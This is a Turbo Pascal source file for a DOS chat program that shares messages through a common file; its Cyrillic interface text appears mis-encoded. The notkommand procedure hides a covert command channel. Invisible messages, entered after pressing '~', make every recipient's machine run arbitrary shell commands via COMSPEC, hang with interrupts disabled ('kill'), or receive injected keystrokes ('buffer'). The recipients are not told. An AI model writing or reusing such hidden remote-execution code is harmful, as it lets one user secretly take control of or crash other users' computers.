{$M 8192,0,0}
{$I-}
uses crt,chervtxt,keybufer,dos,rmk,upcas,coder;
const
    left= 3;    left_2= 14;    right=64;
    YYY_1=6;    YYY_2=20;      rright=79;
    YYY_3=24;
    obnov=30000;
    defaultFILEST='d:\tmp\chat.ru                  ';
    rolpa=ord('~');rolpa2=#1#2#5#1; OPOZN='CHAT_NAVIGATOR'#12#1#3#8;

var myname:string[10];
    nick:string[10];
    nicks:array[1..100]of string[10];
    cur_nick,size,i:byte;
    clock:longint;
    FILEST,s_:string;
    f:text;
    ff:file of byte;
    aaa2,aaa1,oldcommand,newcommand:word;
    SSSS,otclic,pribyl,CHAT,visible,obnovlfirst:boolean;




















{---------------------------------------------------------------------}
procedure interf;forward;
procedure vhod;forward;
procedure window(x,y,xx,yy:WORD);
begin
windmin:=(y-1)*$100+x-1;
windmax:=(yy-1)*$100+xx-1;
end;












{---------------------------------------------------------------------}
procedure writeq(ss:string;g,p:boolean);
var hh,m:byte;
begin
  m:=  textattr;
  textattr:=14;
  if p then
  if (ss[1] <>#7) and (ss[1] <>#6) then begin
  for hh:=1 to 10 do
  if ord(ss[hh])<>7 then
  write(ss[hh])else if g then write(chr(1));
  textattr:=m;
  for hh:=11 to ord(ss[0]) do
  if ord(ss[hh])<>7 then
  write(ss[hh])else if g then write(chr(1));
  end else begin textattr:=lightgray*$10+red;
  for hh:=1 to ord(ss[0])do
  if ord(ss[hh])<>7 then
  write(ss[hh])else if g then write(chr(1));
  end else  for hh:=1 to ord(ss[0])do
  if ord(ss[hh])<>7 then
  write(ss[hh])else if g then write(chr(1));
;
  textattr:=m;
end;















{---------------------------------------------------------------------}
function notkommand(ss:string):boolean;
var ggy,sss:string;m,xox,yoy,i,k,x,y:byte;XOXX,XOOX:word;
begin
notkommand:=true;

if ss[1]=chr(6)then
begin
delete(ss,1,1);
notkommand:=false;
inc (newcommand);
if newcommand>oldcommand then
begin
inc(oldcommand);
inc(cur_nick);
nicks[cur_nick]:=ss;
end;
end ;


if ss[1]=chr(7)then
begin
delete(ss,1,1);
notkommand:=false;

inc (newcommand);
if newcommand>oldcommand then
begin    inc(oldcommand);k:=1;
if downcase_(ss)='all otclic'then cur_nick:=0;
if pos(downcase_(myname+' '),downcase_(ss))=1 then delete(ss,1,ord(myname[0])+1)else
if pos('all ',downcase_(ss))=1 then delete(ss,1,4)else k:=0;
if (k=1) and not obnovlfirst then
begin
while k<>0 do
begin
while (ss[1]=' ')and (ss[0]<>#0) do delete(ss,1,1);
k:=0;
if pos('text',downcase_(ss))=1 then
  begin k:=1;
  delete(ss,1,5);
  while (ord(ss[0])>=k)and (ss[k]<>'\')do begin write(ss[k]);k:=k+1;end;
  delete(ss,1,k);
  end;
if pos('pause',downcase_(ss))=1 then
  begin k:=1;
  if not ssss then close(f);
  ssss:=true;
  size:=1;
  delete(ss,1,6);
  while not keypressed do;
  while keypressed do readkey;
  end;
if pos('pic',downcase_(ss))=1 then
  begin k:=1;
  if not ssss then   close(f);
  ssss:=true;
  size:=1;

  delete(ss,1,4);
  write(#7);
  end;
if pos('nick',downcase_(ss))=1 then
  begin k:=1;
  if not ssss then   close(f);
  ssss:=true;
  size:=1;
  delete(ss,1,5);
  k:=ord(ss[0]);
  ss[0]:=chr(pos('\',ss));
  if ord(ss[0])=0then ss[0]:=chr(k);
  myname:=ss;
  ggy:='                     ';
  ggy:=myname+':';
  ggy[0]:=#10;
  nick:=ggy;
  write(ggy);
  XOX:=whereX;
  YOY:=wherey;
  XOXX:=windmin;
  XOOX:=windmax;
  windmin:=(YYY_3-1)*$100+left-1;
  windmax:=(YYY_3-1)*$100+left_2-1;
  gotoxy(1,1);write(nick);
  windmin:=XOXX;
  windmax:=XOOX;
  gotoxy(xox,yoy);
  ss[0]:=chr(k);
  delete(ss,1,pos('\',ss));
  obnovlfirst:=true;
  end;
if pos('run',downcase_(ss))=1 then
  begin k:=1;
  if not ssss then   close(f);
  ssss:=true;
  size:=1;
  delete(ss,1,4);
  k:=ord(ss[0]);
  if(pos('\',ss)<>0)then
  ss[0]:=chr(pos('\',ss)-1)else k:=0;
  x:=wherex;
  y:=wherey;
   textattr:=15;
   windmin:=0;
   windmax:=25*$100+79;
   clrscr;
   SwapVectors;
   Exec(GetEnv('COMSPEC'), '/c '+ss);
   SwapVectors;
   ss[0]:=chr(k);
   delete(ss,1,pos('\',ss));
   window(1,1,80,25);
   textmode(co80);
   interf;
   window(left,yyy_1,right,yyy_2);
   size:=1;
   end;
if pos('exit',downcase_(ss))=1 then begin k:=1;delete(ss,1,5); chat:=false;end;
if pos('kill',downcase_(ss))=1 then begin if not ssss then   close(f); inline($FA);  while true do;  end;
if pos('otclic',downcase_(ss))=1 then
  begin
  k:=0;
  otclic:=true;
  cur_nick:=0;
  end;
if pos('buffer ',downcase_(ss))=1 then
  begin k:=1;
  delete(ss,1,7);
  m:=ord(ss[0]);
  while k<= ord(ss[0]) do
   if ss[k] = '\'then
   begin
   delete(ss,k,1);
   case ss[k] of
    'n','N':ss[k]:=#13;
    'e','E':ss[k]:=#27;
    '\':;
    else ss[0]:=chr(k);
    end;
    inc(k);
   end else inc(k);
   dec(k);
   write_string_to_buffer(ss);
    ss[0]:=chr(m-1);
   delete(ss,1,k);
  end;

end;
end;
end;
end;
textattr:=6;
end;








{---------------------------------------------------------------------}
procedure interf;
var iii:byte;
begin
window(1,1,80,25);
iii:=0;
while iii<200do begin iii:=iii+1; write('          ');end;
textattr:=4;gotoxy(30,2);write('§Æ°‡Æ ØÆ¶†´„¢†‚Ï ·Ó§†');
textattr:=green;gotoxy(25,3);write('¨Î ‡†§Î Ø‡®¢•‚·‚¢Æ¢†‚Ï ÇÄá ·§•ßÏ');
textattr:=yellow;
ramka(left-1,YYY_1-1,right+1,YYY_2+1);
gotoxy(left+2,YYY_1-1);
write(' 1 ãë - ùíé åéôçéëíú êÄáÇàÇÄÖåÄü ãéòÄÑúû Ñãàççéâ Ç 1 åÖíê ');
gotoxy(left+33,YYY_2+1);
write(' made by nic navigator''01 ');
textattr:=12;
ramka(left-1,YYY_3-1,right+1,YYY_3+1);
gotoxy(left_2+6,YYY_3-1);write(' Á„¢†™, Ø®Ë® ZDECb ');
gotoxy(left_2,yyy_3-1);write('À');
gotoxy(left_2,yyy_3);write('∫');
gotoxy(left_2,yyy_3+1);write(' ');
gotoxy(left,YYY_3);write(nick);
end;

















{---------------------------------------------------------------------}
procedure vhod;
var yyyy:boolean;a:char;ggy:string;
begin
assign(f,filest);reset(f);close(f);if IOResult<>0then begin rewrite(f);writeln(f,OPOZN);close(f); end;
clrscr;
interf;
textattr:=4;gotoxy(left,YYY_3);write('Ç†Ë ç®™:');
textattr:=14;
myname:='';
yyyy:=true;
windmin:=(yyy_3-1)*$100+left_2+1;
windmax:=(YYY_3-1)*$100+right;
gotoxy(1,1);
while yyyy do
begin
write(' '#8);
cherv_txt;
if keypressed then
  begin
  a:=readkey;
{  if a in[]then a:=chr(ord(a)-ord('A')+ord('a'));
}  if (a in['A'..'Z','a'..'z','_']) and (myname[0]<#9)then myname:=myname+a else
  if a=#27 then begin chat:=false; exit end else
  if (a=#13)and (myname[0]>#1)then yyyy:=false else
  if a=#8 then if myname[0]<>#0 then myname[0]:=chr(ord(myname[0])-1) else else
  if a=#0 then readkey;
  gotoxy(1,1);
  write(myname+' '+#8);
  while keypressed do   readkey;
  end;
end;
ggy:='                     ';
ggy:=myname+':';
ggy[0]:=#10;
nick:=ggy;
window(left_2+1,yyy_3,right,YYY_3);
clrscr;
window(left,yyy_3,left_2-1,YYY_3);
clrscr;
gotoxy(left,YYY_3);
write(nick);
window(left_2+2,yyy_3,right,YYY_3);
pribyl:=true;
end;















{---------------------------------------------------------------------}
procedure obnovl;
var  ss:string;a:char;hh,xOx,yoy:byte;xoox1,xoox2:word;
begin
xox:=wherex;
yoy:=wherey;
xoox1:=windmin;
xoox2:=windmax;

newcommand:=0;
clock:=0;
textattr:=6;
window(1,1,80,25);
textattr:=14;
ramka(right+3,yyy_1-1,rright+1,yyy_2-1);
window(right+4,yyy_1,rright,yyy_2-2);
clrscr;
window(right+4,yyy_1,rright+1,yyy_2-2);
textattr:=4;
for hh:=1 to cur_nick do
write(hh:2,' ',nicks[hh],#10#13);
window(left,YYY_1,right,YYY_2);
clrscr;
reset(f);
while IOResult<>0 do begin close(f); reset(f);end;

read(f,ss);read(f,a);read(f,a);
if pos(ss,OPOZN)<>1then begin WRITE('file ',filest,'isn''t a chat ');halt;end;
ssss:=false;
while (NOT ssss)AND(not eof(f)) do begin
read(f,ss);read(f,a);read(f,a);
ss:=decode(ss);
if not visible then
  begin
    if notkommand(ss) then
    writeq(ss+#10+#13,false,true)else
  end else begin writeq(ss,true,true);writeln;end;
end;
if not ssss then close(f);
obnovlfirst:=false;
oldcommand:=newcommand;
windmin:=xoox1;
windmax:=xoox2;
textattr:=4;
gotoxy(xox,yoy);
end;














{---------------------------------------------------------------------}
procedure chat_;
var a,size2:byte;
begin
WHILE CHAT do
begin
write(' '#8);
textattr:=4;
cherv_txt;
if clock>obnov then
begin
assign(ff,filest);
reset(ff);
while IOResult<>0 do begin close(ff); reset(ff);end;
size2:=filesize(ff);
close(ff);
if size<> size2 then obnovl;
size:=size2;
clock:=0;
end;
inc(clock);
if otclic then
  begin
  otclic:=false;
  assign(f,filest);
  Append(f);
  while IOResult<>0 do begin close(f); append(f);end;
  writeln(f,code(#6+myname));
  close(f);
  end;
if pribyl then
  begin
  pribyl:=false;
  assign(f,filest);
  Append(f);
  while IOResult<>0 do begin close(f); append(f);end;

  writeln(f,code(#7+'all otclic'));
  close(f);
  end;
if keypressed and chat then
   begin
   window(left_2+2,YYY_3,right,YYY_3);
   a:=ord (readkey);
   if a=27 then CHAT:= false else
   if a=8  then if ord(s_[0])>=1 then s_[0]:=chr(ord(s_[0])-1)else else
   if a=rolpa then begin s_:=s_+chr(7); visible:=true; size:=1;end else
   if a=13 then
      begin
      assign(f,filest);
      Append(f);
      while IOResult<>0 do begin close(f); append(f);end;
      if ord(s_[1])=7 then
      writeln(f,code(s_)) else
      if ord(s_[0])<>0then
      writeln(f,code(nick+s_));
      close(f);
      clrscr;
      s_:='';
      end else
    if not visible and( a=0) then readkey else
   s_:=s_+chr(a);
   textattr:=14;
gotoxy(1,1);
   writeq(s_+' '+chr(8),true,false);
   WINDOW(1,1,80,25);
   gotoxy(left_2+2+ord(s_[0]),YYY_3);
   end;
end;
  assign(f,filest);
  Append(f);
  while IOResult<>0 do begin close(f); append(f);end;
  writeln(f,code(#7+'all otclic'));
  close(f);
end;




{---------------------------------------------------------------------}
{---------------------------------------------------------------------}
begin
ssss:=false;
oldcommand:=0;
filest:=defaultfilest;
cur_nick:=0;
key:=rolpa2;
nick:='';
clock:=obnov;
visible:=false;
chervinit(right+4,yyy_2+1,rright,yyy_3,3000);
CHAT:=true;
obnovlfirst:=false; {-===============================~~~!!!!!!!!!!!!!!!!!}
obnovlfirst:=true;
oldcommand:=0;
newcommand:=0;
vhod;
chat_;
windmin:=0;  windmax:=25*$100+79;
textattr:=15;clrscr;
end.

















{}